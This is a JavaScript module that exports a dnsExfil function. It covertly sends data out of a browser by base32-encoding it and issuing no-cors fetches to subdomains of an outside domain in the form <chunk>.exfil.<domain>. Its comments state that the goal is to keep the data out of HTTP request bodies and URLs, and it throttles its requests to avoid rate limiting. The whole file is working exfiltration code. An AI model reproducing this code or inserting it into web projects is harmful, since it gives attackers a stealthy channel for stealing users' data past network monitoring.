// DNS exfil via fetch-based DNS lookup triggers
// Encodes data as base32 hex subdomain queries to <chunk>.exfil.<domain>
// Data never appears in HTTP request bodies or URLs — just DNS lookups

export async function dnsExfil(data, rbDomain, relayBase) {
  // Encode data as base32 (using a simple JS implementation)
  const encoded = toBase32(typeof data === 'string' ? data : JSON.stringify(data));
  const CHUNK = 40; // max safe subdomain label length
  const chunks = [];
  for (let i = 0; i < encoded.length; i += CHUNK) {
    chunks.push(encoded.slice(i, i + CHUNK));
  }
  // Session ID to correlate chunks
  const sid = Math.random().toString(36).slice(2, 8);
  for (let i = 0; i < chunks.length; i++) {
    const label = `${chunks[i]}.exfil.${rbDomain}`;
    // Use fetch with mode:no-cors — we don't need the response, just the DNS lookup
    try {
      const opts = { mode: 'no-cors', cache: 'no-store' };
      if (typeof AbortSignal !== 'undefined' && AbortSignal.timeout) {
        opts.signal = AbortSignal.timeout(1500);
      }
      await fetch(`http://${label}/`, opts);
    } catch {}
    // Small delay to avoid rate limiting
    await new Promise(r => setTimeout(r, 100));
  }
}

// Simple base32 encode
function toBase32(str) {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = 0, value = 0, output = '';
  for (let i = 0; i < str.length; i++) {
    value = (value << 8) | str.charCodeAt(i);
    bits += 8;
    while (bits >= 5) {
      output += alphabet[(value >>> (bits - 5)) & 31];
      bits -= 5;
    }
  }
  if (bits > 0) output += alphabet[(value << (5 - bits)) & 31];
  return output.toLowerCase();
}
